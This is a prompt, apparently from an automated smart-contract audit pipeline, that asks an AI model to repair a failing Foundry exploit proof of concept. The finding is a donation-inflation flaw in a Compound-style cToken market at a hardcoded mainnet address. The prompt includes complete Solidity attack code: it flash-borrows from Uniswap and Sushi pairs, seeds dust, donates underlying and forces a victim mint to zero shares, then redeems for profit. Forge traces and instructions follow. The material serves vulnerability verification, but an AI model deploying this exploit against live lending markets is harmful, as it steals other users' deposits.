You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Thin-market donation inflation lets an attacker steal later deposits
- claim: `exchangeRateStoredInternal()` prices shares from the contract's raw underlying balance via `getCashPrior()`, so direct token donations raise the exchange rate without minting any new cTokens. `mintFresh()` then floors `actualMintAmount / exchangeRate` and does not require `mintTokens > 0`, letting a thin-market attacker who already owns nearly all supply force later minters to receive too few, or even zero, cTokens.
- impact: In an empty or very thin market, an attacker can seed a dust position, donate underlying to inflate the exchange rate, then front-run a victim mint so the victim donates assets for negligible or zero shares. The attacker can then redeem their cTokens against the victim's deposit, stealing most or all of it.
- exploit_paths: ["Mint a dust amount into an empty or near-empty market so the attacker owns essentially all cTokens.", "Transfer underlying directly to the cToken contract, increasing `getCashPrior()` without increasing `totalSupply`.", "Front-run a victim `mint()`; `mintFresh()` reads the inflated exchange rate and floors the victim's minted shares.", "Redeem the attacker's cTokens to withdraw the donated cash plus the victim's deposit."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function exchangeRateStored() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract VictimMinter {
    function mintInto(address market, address underlying, uint256 amount) external {
        IERC20Like token = IERC20Like(underlying);
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, market, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, market, amount));

        // The later victim enters the market through mint(), which immediately routes into
        // mintFresh() in the target cToken implementation.
        require(ICTokenLike(market).mint(amount) == 0, "VICTIM_MINT_FAILED");
    }

    function _callOptionalReturn(IERC20Like token, bytes memory data) internal {
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "TOKEN_CALL_FAILED");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "TOKEN_CALL_FALSE");
        }
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    uint256 internal constant EXP_SCALE = 1e18;
    uint256 internal constant BPS_DENOMINATOR = 10_000;
    uint256 internal constant DOMINANCE_BPS = 9_990;
    uint256 internal constant LOAN_RESERVE_DIVISOR = 1_000;
    uint256 internal constant MIN_FLASH_LOAN = 1;

    bool public attempted;

    address internal cachedUnderlying;
    address public flashPair;
    address public victimHelper;

    uint256 public baselineBalance;
    uint256 public flashBorrowAmount;
    uint256 public seededUnderlyingAmount;
    uint256 public donatedUnderlyingAmount;
    uint256 public victimMintAmount;
    uint256 public attackerCTokenBalance;
    uint256 public postDonationExchangeRate;
    uint256 public realizedProfit;

    constructor() {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        address underlying = _underlying();
        IERC20Like underlyingToken = IERC20Like(underlying);
        baselineBalance = underlyingToken.balanceOf(address(this));

        if (baselineBalance != 0) {
            _runExploit(underlyingToken);
            _updateProfit(underlyingToken);
            return;
        }

        (address pair, uint256 loanAmount) = _findFundingPair(underlying);
        if (pair == address(0) || loanAmount == 0) {
            return;
        }

        flashPair = pair;
        flashBorrowAmount = loanAmount;

        IUniswapV2PairLike lp = IUniswapV2PairLike(pair);
        uint256 amount0Out = lp.token0() == underlying ? loanAmount : 0;
        uint256 amount1Out = lp.token1() == underlying ? loanAmount : 0;

        // Realistic public funding step for the single-tx PoC: borrow the existing on-chain
        // underlying from a V2 pair, run the seed/donate/victim mint/withdraw sequence, then repay.
        lp.swap(amount0Out, amount1Out, address(this), abi.encode(loanAmount));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == flashPair, "UNEXPECTED_PAIR");
        require(sender == address(this), "UNEXPECTED_SENDER");

        uint256 borrowedAmount = amount0 != 0 ? amount0 : amount1;
        IERC20Like underlyingToken = IERC20Like(_underlying());

        _runExploit(underlyingToken);

        uint256 repayment = _flashRepayment(borrowedAmount);
        require(underlyingToken.balanceOf(address(this)) >= repayment, "FLASH_UNDERFUNDED");
        _safeTransfer(underlyingToken, flashPair, repayment);

        _updateProfit(underlyingToken);
    }

    function profitToken() external view returns (address) {
        address underlying = cachedUnderlying;
        if (underlying == address(0)) {
            return ICTokenLike(TARGET).underlying();
        }
        return underlying;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }

    function _runExploit(IERC20Like underlyingToken) internal {
        ICTokenLike market = ICTokenLike(TARGET);
        uint256 availableBalance = underlyingToken.balanceOf(address(this));
        if (availableBalance == 0) {
            return;
        }

        uint256 seedAmount = _computeSeedAmount(market);
        if (seedAmount == 0 || seedAmount >= availableBalance) {
            return;
        }

        // Path 1: mint a dust or dominance-sized position so the attacker owns essentially all cTokens.
        _forceApprove(underlyingToken, TARGET, seedAmount);
        require(market.mint(seedAmount) == 0, "SEED_MINT_FAILED");

        uint256 cTokenBalance = market.balanceOf(address(this));
        uint256 supplyAfterSeed = market.totalSupply();
        if (cTokenBalance == 0 || !_hasDominance(cTokenBalance, supplyAfterSeed)) {
            return;
        }

        uint256 remainingUnderlying = underlyingToken.balanceOf(address(this));
        if (remainingUnderlying <= 1) {
            return;
        }

        uint256 victimAmount = _computeVictimMintAmount(market, supplyAfterSeed, remainingUnderlying);
        if (victimAmount == 0 || victimAmount >= remainingUnderlying) {
            return;
        }

        uint256 donationAmount = remainingUnderlying - victimAmount;

        // Path 2: donate underlying directly to the cToken so exchangeRateStoredInternal()
        // sees the higher raw balance through getCashPrior(), without minting any new cTokens.
        _safeTransfer(underlyingToken, TARGET, donationAmount);
        postDonationExchangeRate = market.exchangeRateStored();

        if (victimHelper == address(0)) {
            victimHelper = address(new VictimMinter());
        }

        // Path 3: the victim's later mint() is forced to execute after the donation. In the target,
        // mint() immediately enters mintFresh(), which floors actualMintAmount / exchangeRate and
        // does not require the victim to receive a non-zero share count.
        _safeTransfer(underlyingToken, victimHelper, victimAmount);
        VictimMinter(victimHelper).mintInto(TARGET, _underlying(), victimAmount);

        // Path 4: withdraw the stolen value by redeeming the attacker's pre-donation cTokens
        // against the donation-inflated pool balance plus the victim's deposit.
        _withdrawStolenUnderlying(cTokenBalance);

        seededUnderlyingAmount = seedAmount;
        donatedUnderlyingAmount = donationAmount;
        victimMintAmount = victimAmount;
        attackerCTokenBalance = cTokenBalance;
    }

    function _computeSeedAmount(ICTokenLike market) internal view returns (uint256) {
        uint256 exchangeRate = market.exchangeRateStored();
        uint256 supplyBefore = market.totalSupply();

        if (supplyBefore == 0) {
            uint256 dustSeed = _ceilDiv(exchangeRate, EXP_SCALE);
            return dustSeed == 0 ? 1 : dustSeed;
        }

        uint256 targetMintTokens = _ceilDiv(supplyBefore * DOMINANCE_BPS, BPS_DENOMINATOR - DOMINANCE_BPS);
        return _ceilDiv(targetMintTokens * exchangeRate, EXP_SCALE);
    }

    function _computeVictimMintAmount(ICTokenLike market, uint256 supplyAfterSeed, uint256 remainingUnderlying)
        internal
        view
        returns (uint256)
    {
        uint256 seededExchangeRate = market.exchangeRateStored();

        // Use the already-published exchange rate to estimate the asset base backing the current
        // shares. This keeps the donation sizing aligned with exchangeRateStoredInternal() even if
        // the market is merely thin, not perfectly empty.
        uint256 assetsBackingShares = (seededExchangeRate * supplyAfterSeed) / EXP_SCALE;
        uint256 maxZeroShareVictimMint = 0;

        if (assetsBackingShares + remainingUnderlying > 1) {
            maxZeroShareVictimMint = (assetsBackingShares + remainingUnderlying - 1) / (supplyAfterSeed + 1);
        }

        if (maxZeroShareVictimMint == 0 || maxZeroShareVictimMint >= remainingUnderlying) {
            maxZeroShareVictimMint = remainingUnderlying / 2;
        }

        return maxZeroShareVictimMint;
    }

    function _withdrawStolenUnderlying(uint256 redeemTokens) internal {
        require(ICTokenLike(TARGET).redeem(redeemTokens) == 0, "ATTACKER_WITHDRAW_FAILED");
    }

    function _findFundingPair(address underlying) internal view returns (address bestPair, uint256 bestLoanAmount) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        address[6] memory bases = [WETH, DAI, FRAX, USDC, USDT, WBTC];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address base = bases[j];
                if (base == underlying) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(underlying, base);
                if (pair == address(0)) {
                    continue;
                }

                IUniswapV2PairLike lp = IUniswapV2PairLike(pair);
                (uint112 reserve0, uint112 reserve1,) = lp.getReserves();
                uint256 underlyingReserve = lp.token0() == underlying ? reserve0 : reserve1;
                uint256 candidateLoan = underlyingReserve / LOAN_RESERVE_DIVISOR;

                if (candidateLoan >= MIN_FLASH_LOAN && candidateLoan > bestLoanAmount) {
                    bestPair = pair;
                    bestLoanAmount = candidateLoan;
                }
            }
        }
    }

    function _underlying() internal returns (address underlying) {
        underlying = cachedUnderlying;
        if (underlying == address(0)) {
            underlying = ICTokenLike(TARGET).underlying();
            cachedUnderlying = underlying;
        }
    }

    function _hasDominance(uint256 attackerBalance, uint256 totalSupply) internal pure returns (bool) {
        return attackerBalance * BPS_DENOMINATOR >= totalSupply * DOMINANCE_BPS;
    }

    function _updateProfit(IERC20Like underlyingToken) internal {
        uint256 currentBalance = underlyingToken.balanceOf(address(this));
        if (currentBalance > baselineBalance) {
            realizedProfit = currentBalance - baselineBalance;
        }
    }

    function _forceApprove(IERC20Like token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, amount));
    }

    function _safeTransfer(IERC20Like token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, amount));
    }

    function _callOptionalReturn(IERC20Like token, bytes memory data) internal {
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "TOKEN_CALL_FAILED");
        if (returndata.length != 0) {
            require(abi.decode(returndata, (bool)), "TOKEN_CALL_FALSE");
        }
    }

    function _flashRepayment(uint256 amountBorrowed) internal pure returns (uint256) {
        return _ceilDiv(amountBorrowed * BPS_DENOMINATOR, 9_970);
    }

    function _ceilDiv(uint256 numerator, uint256 denominator) internal pure returns (uint256) {
        if (numerator == 0) {
            return 0;
        }
        return ((numerator - 1) / denominator) + 1;
    }
}

```

forge stdout (tail):
```
fit below threshold] testExploit() (gas: 120342)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xf573E6740045b5387F6d36a26B102C2adF639af5
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 7810

Traces:
  [120342] FlawVerifierTest::testExploit()
    ├─ [7810] FlawVerifier::profitToken() [staticcall]
    │   ├─ [2426] 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5::underlying() [staticcall]
    │   │   └─ ← [Return] 0xf573E6740045b5387F6d36a26B102C2adF639af5
    │   └─ ← [Return] 0xf573E6740045b5387F6d36a26B102C2adF639af5
    ├─ [2612] 0xf573E6740045b5387F6d36a26B102C2adF639af5::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [70058] FlawVerifier::executeOnOpportunity()
    │   ├─ [426] 0xf5140fC35C6f94D02d7466f793fEB0216082d7E5::underlying() [staticcall]
    │   │   └─ ← [Return] 0xf573E6740045b5387F6d36a26B102C2adF639af5
    │   ├─ [612] 0xf573E6740045b5387F6d36a26B102C2adF639af5::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xf573E6740045b5387F6d36a26B102C2adF639af5, 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [434] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xf573E6740045b5387F6d36a26B102C2adF639af5
    ├─ [2366] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [612] 0xf573E6740045b5387F6d36a26B102C2adF639af5::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xf573E6740045b5387F6d36a26B102C2adF639af5)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18385885 [1.838e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7810)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 8.05s (6.65s CPU time)

Ran 1 test suite in 8.07s (8.05s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 120342)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
